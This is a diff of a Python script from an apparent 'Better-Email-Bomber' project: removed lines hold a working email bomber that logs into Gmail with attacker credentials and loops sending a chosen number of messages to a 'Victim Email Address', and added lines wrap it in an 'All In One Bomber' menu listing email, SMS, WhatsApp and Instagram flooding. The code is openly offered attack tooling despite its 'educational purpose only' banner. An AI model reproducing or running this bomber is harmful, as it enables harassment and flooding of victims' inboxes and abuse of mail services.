@@ -1,12 +1,8 @@
-from os import urandom
-import smtplib
-from email.message import EmailMessage
-from getpass import getpass
-from simple_chalk import chalk, green
+from simple_chalk import chalk
+from email_bomber import ebombingwin
 import sys
-from time import sleep
 
-Text = """
+Bomber = """
             ▄████████  ▄█        ▄█             ▄█  ███▄▄▄▄         ▄██████▄  ███▄▄▄▄      ▄████████ 
            ███    ███ ███       ███            ███  ███▀▀▀██▄      ███    ███ ███▀▀▀██▄   ███    ███ 
            ███    ███ ███       ███            ███▌ ███   ███      ███    ███ ███   ███   ███    █▀  
@@ -16,72 +12,54 @@ Text = """
            ███    ███ ███▌    ▄ ███▌    ▄      ███  ███   ███      ███    ███ ███   ███   ███    ███ 
            ███    █▀  █████▄▄██ █████▄▄██      █▀    ▀█   █▀        ▀██████▀   ▀█   █▀    ██████████ 
                       ▀         ▀                                                                    
-                   ▀█████████▄   ▄██████▄    ▄▄▄▄███▄▄▄▄   ▀█████████▄     ▄████████    ▄████████    
-                     ███    ███ ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███   ███    ███   ███    ███    
-                     ███    ███ ███    ███ ███   ███   ███   ███    ███   ███    █▀    ███    ███    
-                    ▄███▄▄▄██▀  ███    ███ ███   ███   ███  ▄███▄▄▄██▀   ▄███▄▄▄      ▄███▄▄▄▄██▀    
-                   ▀▀███▀▀▀██▄  ███    ███ ███   ███   ███ ▀▀███▀▀▀██▄  ▀▀███▀▀▀     ▀▀███▀▀▀▀▀      
-                     ███    ██▄ ███    ███ ███   ███   ███   ███    ██▄   ███    █▄  ▀███████████    
-                     ███    ███ ███    ███ ███   ███   ███   ███    ███   ███    ███   ███    ███    
-                   ▄█████████▀   ▀██████▀   ▀█   ███   █▀  ▄█████████▀    ██████████   ███    ███    
-                                                                                       ███    ███    
+                ▀█████████▄   ▄██████▄    ▄▄▄▄███▄▄▄▄   ▀█████████▄     ▄████████    ▄████████    
+                  ███    ███ ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███   ███    ███   ███    ███    
+                  ███    ███ ███    ███ ███   ███   ███   ███    ███   ███    █▀    ███    ███    
+                 ▄███▄▄▄██▀  ███    ███ ███   ███   ███  ▄███▄▄▄██▀   ▄███▄▄▄      ▄███▄▄▄▄██▀    
+                ▀▀███▀▀▀██▄  ███    ███ ███   ███   ███ ▀▀███▀▀▀██▄  ▀▀███▀▀▀     ▀▀███▀▀▀▀▀       
+                  ███    ██▄ ███    ███ ███   ███   ███   ███    ██▄   ███    █▄  ▀███████████    
+                  ███    ███ ███    ███ ███   ███   ███   ███    ███   ███    ███   ███    ███    
+                ▄█████████▀   ▀██████▀   ▀█   ███   █▀  ▄█████████▀    ██████████   ███    ███    
+                                                                                    ███    ███    
 """
 
-print('                                                                    ')
-print('                                                                    ')
-print(chalk.yellow.bold(Text))
-print('\n\n')
-print(chalk.red.bold("                         Please use this tool for educational purpose only.                            "))
-print(chalk.red.bold("                   Github : https://github.com/Nocturnal-Compiler/Better-Email-Bomber                  "))
-print('\n\n')
-user = input(chalk.green('[1] ----> Anonymous name: '))
-email = input(chalk.green('\n[2] ----> Attacker Email Address: '))
-passwd = getpass(chalk.green.bold('\n[3] ----> Attacker Email Password: '))
-to = input(chalk.red('\n[4] ----> Victim Email Address: '))
-total = input(chalk.blue('\n[5] ----> Number of emails: '))
-subject = input(chalk.blue('\n[6] ----> [Title Of The Email] Subject: '))
-body = input(chalk.blue('\n[7] ----> Message: '))
-time = input(chalk.green('\n[8] ----> Time to wait between each email (in Seconds): '))
-Cserver = input(chalk.red('\n[+] Custom smtp server (leave blank to use gmail): '))
+Creds = """
+                                ************************************************  
+                                *   All In One Bomber - By NocturnalCompiler   * 
+                                *            Version 2.0.0 (Stable)            *       
+                                *         Discord : fyodor_dostoyevsky.        *      
+                                ************************************************                                     
 
-if not Cserver == '':
-    defaultconf = False
-    smtp_server = Cserver
-    Cport = input('Custom smtp port (leave blank to use defaul port): ')
-    if not Cport == '':
-        port = int(Cport)
-    else:
-        port = 587
-else:
-    smtp_server = 'smtp.gmail.com'
-    port = 587
-    defaultconf = True
+"""
 
+Options = """
+    |-TYPE---------------------|
+    | [1] - Email Bomber       |
+    | [2] - SMS Bomber         |
+    | [3] - WhatsApp Bomber    |
+    | [4] - Instagram Bomber   |
+    | [5] - Exit               |
+    |--------------------------|"""
 
-try:
-    server = smtplib.SMTP(smtp_server, port)
-    server.ehlo()
-    server.starttls()
-    server.login(email, passwd)
-    for i in range(1, int(total) + 1):
-        msg = EmailMessage()
-        msg['Subject'] = subject
-        msg['From'] = email
-        msg['To'] = to
-        msg.set_content(body)
-        server.send_message(msg)
-        print(chalk.green.bold("\r[+] E-mails sent: %i" % i))
-        sleep(time)
-        sys.stdout.flush()
-    server.quit()
-    print('\n Done !!!')
+print(chalk.yellow.bold(Bomber))
+print(chalk.cyanBright(Creds))
+print(chalk.red.bold("                              Please use this tool for educational purpose only.                            "))
+print(chalk.red.bold("                      Github : https://github.com/Nocturnal-Compiler/Better-Email-Bomber                  "))
+print('\n')
+print(chalk.green.bold(Options))
+opt = int(input(chalk.blue.bold("    |-> Enter the option number : ")))
+
+if opt == 1:
+    ebombingwin()
+
+elif opt == 2:
+    print(chalk.red.bold("SMS Bomber is under development. Please try again later."))
     sys.exit()
-except KeyboardInterrupt:
-    print(chalk.red('[-] Canceled'))
+
+elif opt == 3:
+    print(chalk.red.bold("WhatsApp Bomber is under development. Please try again later."))
     sys.exit()
-except smtplib.SMTPAuthenticationError:
-    print(chalk.red.bold('[!] The username or password you entered is incorrect'))
-    sys.exit()
-except smtplib.SMTPConnectError:
-    print(chalk.red.bold('\n[!] Failed to connect with the SMTP server'))
+
+elif opt == 4:
+    print(chalk.red.bold("Instagram Bomber is under development. Please try again later."))
     sys.exit()
